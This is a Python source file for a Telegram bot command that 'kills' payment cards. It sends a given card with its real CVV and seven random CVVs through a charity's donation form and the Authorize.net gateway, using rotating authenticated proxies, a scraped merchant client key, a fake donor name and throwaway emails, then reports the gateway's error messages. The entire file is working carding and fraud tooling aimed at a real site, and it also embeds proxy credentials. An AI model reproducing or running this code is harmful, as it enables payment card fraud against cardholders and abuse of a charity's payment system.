import requests
import re
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from requests.exceptions import Timeout, RequestException

# Configuration
MAX_RETRIES = 3
RETRY_DELAY = 3  # Seconds
THREADS = 5  # Number of concurrent threads

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Proxy configurations
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more proxies if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

def get_random_user_agent() -> str:
    """Returns a Chrome-based User-Agent."""
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'

def generate_random_email() -> str:
    """Generate a random email."""
    return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"

def get_authorize_token(session: requests.Session, card_info: str, cvv: str, proxy: dict) -> str:
    """Fetches the Authorize.net dataValue token with exact headers from working example."""
    card_parts = re.split(r'[|/ ]', card_info.strip())
    cc, mm, yy, _ = card_parts
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://todaywillbegreat.org',
        'Referer': 'https://todaywillbegreat.org/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': get_random_user_agent(),
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    json_data = {
        'securePaymentContainerRequest': {
            'merchantAuthentication': {
                'name': '6xkH56HaEQrh',
                'clientKey': '9FZBm58A7PmmW7gG857Mg2SY4B299M74ceLB97Wg3cjVNpqrm9btce5FcA297Xjd',
            },
            'data': {
                'type': 'TOKEN',
                'id': f"{random.getrandbits(128):032x}",
                'token': {
                    'cardNumber': cc,
                    'expirationDate': f"{mm}{yy}",
                    'cardCode': cvv,
                },
            },
        },
    }
    
    for attempt in range(MAX_RETRIES):
        try:
            response = session.post(
                'https://api2.authorize.net/xml/v1/request.api',
                headers=headers,
                json=json_data,
                proxies=proxy,
                timeout=10
            )
            pattern = r'"dataValue":\s*"([^"]+)"'
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
            logger.error("No dataValue found in Authorize.net response")
            return None
        except Timeout as e:
            logger.warning(f"Timeout error fetching Authorize.net token, attempt {attempt + 1}/{MAX_RETRIES}: {str(e)}")
        except Exception as e:
            logger.error(f"Error fetching Authorize.net token: {str(e)}")
        time.sleep(RETRY_DELAY)
    return None

def reset_form_nonce(session: requests.Session, proxy: dict) -> Tuple[str, str]:
    """Resets the form nonce with exact headers from working example."""
    headers = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://todaywillbegreat.org',
        'priority': 'u=1, i',
        'referer': 'https://todaywillbegreat.org/donate/?form-id=397&payment-mode=authorize&level-id=0',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': get_random_user_agent(),
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'give_donation_form_reset_all_nonce',
        'give_form_id': '397',
    }
    
    for attempt in range(MAX_RETRIES):
        try:
            response = session.post(
                'https://todaywillbegreat.org/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=10
            )
            response_data = response.json()
            return response_data['data']['give_form_hash'], response_data['data']['give_form_user_register_hash']
        except Timeout as e:
            logger.warning(f"Timeout error resetting form nonce, attempt {attempt + 1}/{MAX_RETRIES}: {str(e)}")
        except Exception as e:
            logger.error(f"Error resetting form nonce: {str(e)}")
        time.sleep(RETRY_DELAY)
    return None, None

def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    """Processes a single CVV with the exact request format from working example."""
    try:
        card_parts = re.split(r'[|/ ]', card_info.strip())
        if len(card_parts) < 4:
            return f"{cvv} - Invalid card format"
            
        cc = card_parts[0]
        
        with requests.Session() as session:
            # Get token
            data_value = get_authorize_token(session, card_info, cvv, proxy)
            if not data_value:
                return f"{cvv} - Token failed"
                
            # Reset nonce
            give_form_hash, give_form_user_register_hash = reset_form_nonce(session, proxy)
            if not give_form_hash:
                return f"{cvv} - Nonce reset failed"
                
            # Submit payment with exact headers from working example
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://todaywillbegreat.org',
                'priority': 'u=0, i',
                'referer': 'https://todaywillbegreat.org/donate/?form-id=397&payment-mode=authorize&level-id=0',
                'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': get_random_user_agent(),
            }
            
            params = {
                'payment-mode': 'authorize',
                'form-id': '397',
            }
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': '397-1',
                'give-form-id': '397',
                'give-form-title': 'Donate',
                'give-current-url': 'https://todaywillbegreat.org/donate/',
                'give-form-url': 'https://todaywillbegreat.org/donate/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': give_form_hash,
                'give-price-id': '0',
                'give-amount': '20.00',
                'payment-mode': 'authorize',
                'give_first': 'Mohammed',
                'give_last': 'Nehal',
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': generate_random_email(),
                'give-form-user-register-hash': give_form_user_register_hash,
                'give-purchase-var': 'needs-to-register',
                'card_number': '0000000000000000',
                'card_cvc': '000',
                'card_name': '0000000000000000',
                'card_exp_month': '00',
                'card_exp_year': '00',
                'card_expiry': '00 / 00',
                'billing_country': 'IN',
                'card_address': 'New York',
                'card_address_2': '',
                'card_city': 'New York',
                'card_state': 'JH',
                'card_zip': '560053',
                'give_authorize_data_descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
                'give_authorize_data_value': data_value,
                'give_action': 'purchase',
                'give-gateway': 'authorize',
            }
            
            try:
                response = session.post(
                    'https://todaywillbegreat.org/donate/',
                    params=params,
                    headers=headers,
                    data=data,
                    proxies=proxy,
                    timeout=10
                )
                
                # Fast error parsing using regex
                if 'give_error give_notice' in response.text:
                    error_msg = re.search(r'<div class="give_error give_notice"><p>(.*?)</p>', response.text)
                    if error_msg:
                        return f"{cvv} - {error_msg.group(1)}"
                return f"{cvv} - No error detected"
                
            except Timeout:
                return f"{cvv} - Request timed out"
            except RequestException as e:
                return f"{cvv} - Request error: {str(e)}"
            except Exception as e:
                return f"{cvv} - Processing error: {str(e)}"
                
    except Exception as e:
        return f"{cvv} - Unexpected error: {str(e)}"

async def kum(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    """Process card and send results to Telegram with CVV randomization."""
    try:
        card_parts = re.split(r'[|/ ]', card_info.strip())
        if len(card_parts) < 4 or not all(p.isdigit() for p in card_parts):
            raise ValueError("Invalid card format")
            
        cc, mm, yy, real_cvv = card_parts[:4]
    except ValueError:
        await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
        return

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()
    cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(7)]  # Test real CVV + 7 random

    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
            results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))

        end_time = time.time()
        total_time = end_time - start_time
        
        # Format results
        result_message = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"
        for result in results:
            result_message += f"{result}\n"
        result_message += f"\n⏱ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: {total_time:.2f} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴\n"
        
        await processing_msg.edit(result_message)
    except Exception as e:
        logger.error(f"Error in kum function: {str(e)}")
        await processing_msg.edit(f"❌ **Error**: Failed to process card - {str(e)}")
